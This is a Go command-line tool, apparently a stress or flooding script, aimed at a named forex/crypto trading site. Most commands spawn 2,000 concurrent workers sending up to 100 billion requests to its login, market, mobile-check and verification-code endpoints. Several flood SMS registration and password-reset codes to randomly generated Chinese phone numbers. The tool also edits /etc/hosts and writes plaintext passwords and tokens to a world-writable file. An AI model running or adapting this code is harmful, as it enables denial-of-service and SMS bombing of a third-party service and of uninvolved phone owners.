package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type LinkNameType string

const (
	OMNILinkNameType LinkNameType = "OMNI"
	ERC20LinkNameType LinkNameType = "ERC20"
	TRC20LinkNameType LinkNameType = "TRC20"
)

type CurrencyType string
const (
	USDTCurrencyType CurrencyType = "USD"
	BTCCurrencyType CurrencyType = "BTC"
	ETHCurrencyType CurrencyType = "ETH"
)

func RandString(len int) string {
	rand.Seed(time.Now().UnixNano())
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		seed := rand.Intn(3)
		b := 0
		if seed == 0 {
			b = rand.Intn(26) + 65
		} else if seed == 1 {
			b = rand.Intn(10) + 48
		} else {
			b = rand.Intn(26) + 97
		}

		bytes[i] = byte(b)
	}
	return string(bytes)
}

func RandInt64(min, max int64) int64 {
	if min >= max || min == 0 || max == 0 {
		return max
	}

	rand.Seed(time.Now().UnixNano())
	return rand.Int63n(max-min) + min
}

type User struct {
	Username string `json:"username"`
	UserId int64 `json:"userId"`
	Email string `json:"email"`
	EmailPassword string `json:"email_password"`
	Password string `json:"password"`
	LoginPassword string `json:"login_password"`
	Phone string `json:"phone"`
	NickName string `json:"nickname"`
	TypeName string `json:"typeName"`
	Type string `json:"type"`
	AccessToken string `json:"access_token"`
	LoginToken string `json:"login_token"`
	Avatar string `json:"avatar"`
}

func LoadUsers(logFile string) ([]*User, error) {
	usersBytes, err := ioutil.ReadFile(logFile)
	if err != nil {
		return nil, err
	}

	users := make([]*User, 1)
	if err := json.Unmarshal(usersBytes, &users); err != nil {
		return nil, err
	}

	return users, nil
}

func DumpUsers(logFile string, users []*User) error {
	usersBytes, _ := json.Marshal(users)
	fmt.Println(string(usersBytes))
	return ioutil.WriteFile(logFile, usersBytes, 0777)
}


var (
	command string
	registryTimes int
	times int64
	seconds int64
	concurrency int
	logFile string
	config map[string]string
)

func init() {
	//runtime.GOMAXPROCS(2)
	flag.StringVar(&command, "command", "default", "命令")
	flag.StringVar(&logFile, "log-file", "user.json", "日志文件")
	flag.IntVar(&registryTimes, "registry-times", 10, "注册账号个数")
	flag.Int64Var(&times, "times", 100000000000, "请求次数")
	flag.Int64Var(&seconds, "seconds", 100000000000, "秒数(时长)")
	flag.IntVar(&concurrency, "concurrency", 2000, "并发数")
	config = map[string]string{
		"host": "https://www.absgroup-fx.com",
		"login": "/user/login",
		"get-user-info": "/user/getUserInfo",
		"registry-verification-code": "/user/getRegisterVerificationCode",
		"edit-password-verification-code": "/user/getEditPasswordVerificationCode",
		"get-market": "/contract/getMarket",
		"check-mobile": "/user/checkMobile",
	}
}

type ResponseData struct {
	Code int `json:"code"`
	Data *User `json:"data"`
	Message string `json:"msg"`
}

func main() {
	flag.Parse()
	commandHandler := map[string]func(){
		"docker-init": func() {
			hostsBytes, err := ioutil.ReadFile("/etc/hosts")
			if err != nil {
				fmt.Println(err)
				return
			}

			hosts := fmt.Sprintf("%s\n216.83.54.194 www.absgroup-fx.com\n", string(hostsBytes))
			if err := ioutil.WriteFile("/etc/hosts", []byte(hosts), 0777); err != nil {
				fmt.Println(err)
				return
			}

			for  {
				time.Sleep(time.Hour)
			}
		},
		// 登录
		"login" : func() {
			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			for index, user := range users {
				url := fmt.Sprintf("%s%s", config["host"], config["login"])
				data := fmt.Sprintf(
					"mobile=%s&password=%s",
					users[index].Username,
					users[index].LoginPassword)

				response, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
				if err != nil {
					fmt.Println(err)
					continue
				}

				responseBody, err := ioutil.ReadAll(response.Body)
				if err != nil {
					fmt.Println(err)
					continue
				}
				fmt.Println(string(responseBody))

				loginResponse := &ResponseData{
					Data: user,
				}
				if err := json.Unmarshal(responseBody, loginResponse); err != nil {
					fmt.Println(err)
					continue
				}
			}

			if err := DumpUsers(logFile, users); err != nil {
				fmt.Println(err)
				return
			}
		},
		"login-press": func() {
			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			count := len(users)
			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func(users []*User, count int) {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						index := RandInt64(0, int64(count - 1))
						//发送数据
						url := fmt.Sprintf("%s%s", config["host"], config["login"])
						data := fmt.Sprintf(
							"mobile=%s&password=%s",
							users[index].Username,
							users[index].LoginPassword)

						_, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
						if err != nil {
							fmt.Println(err)
							continue
						}

						//responseBytes, _ := ioutil.ReadAll(response.Body)
						//fmt.Println(string(responseBytes))
						atomic.AddInt64(&times, -1)
					}
				}(users, count)
			}
			wg.Wait()
		},
		// 获取用户信息
		"get-user-info": func() {
			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			for _, user := range users {
				url := fmt.Sprintf("%s%s?accessToken=%s",
					config["host"], config["get-user-info"], user.AccessToken)
				response, err := http.Get(url)
				if err != nil {
					fmt.Println(err)
					continue
				}

				responseBody, err := ioutil.ReadAll(response.Body)
				if err != nil {
					fmt.Println(err)
					continue
				}
				fmt.Println(string(responseBody))

				loginResponse := &ResponseData{
					Data: user,
				}
				if err := json.Unmarshal(responseBody, loginResponse); err != nil {
					fmt.Println(err)
					continue
				}
			}

			if err := DumpUsers(logFile, users); err != nil {
				fmt.Println(err)
				return
			}
		},
		// 刷市场; 无登录刷
		"get-market-press": func() {
			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						//发送数据
						url := fmt.Sprintf("%s%s",
							config["host"], config["get-market"])
						response, err := http.Post(url, "application/x-www-form-urlencoded", nil)
						if err != nil {
							fmt.Println(err)
							continue
						}

						responseBytes, _ := ioutil.ReadAll(response.Body)
						fmt.Println(string(responseBytes))
						atomic.AddInt64(&times, -1)
					}
				}()
			}
			wg.Wait()
		},
		// 刷检测手机号码; 无登录刷
		"check-mobile-press": func() {
			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						//发送数据
						url := fmt.Sprintf("%s%s?mobile=%d",
							config["host"], config["check-mobile"],
							RandInt64(13000000000, 13999999999))
						response, err := http.Get(url)
						if err != nil {
							fmt.Println(err)
							continue
						}

						responseBytes, _ := ioutil.ReadAll(response.Body)
						fmt.Println(string(responseBytes))
						atomic.AddInt64(&times, -1)
					}
				}()
			}
			wg.Wait()
		},
		// 刷注册码
		"registry-verification-code-press" : func() {
			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						//发送数据
						url := fmt.Sprintf("%s%s", config["host"], config["registry-verification-code"])
						data := fmt.Sprintf(
							"mobile=%d",
							RandInt64(13000000000, 13999999999))

						response, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
						if err != nil {
							fmt.Println(err)
							continue
						}

						responseBytes, _ := ioutil.ReadAll(response.Body)
						fmt.Println(string(responseBytes))
						atomic.AddInt64(&times, -1)
					}
				}()
			}
			wg.Wait()
		},
		// 刷修改密码短信验证码
		"edit-password-verification-code-press" : func() {
			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						//发送数据
						url := fmt.Sprintf("%s%s", config["host"], config["edit-password-verification-code"])
						data := fmt.Sprintf(
							"mobile=%d",
							RandInt64(13000000000, 13999999999))

						response, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
						if err != nil {
							fmt.Println(err)
							continue
						}

						responseBytes, _ := ioutil.ReadAll(response.Body)
						fmt.Println(string(responseBytes))
						atomic.AddInt64(&times, -1)
					}
				}()
			}
			wg.Wait()
		},
	}
	commandHandler[command]()
}
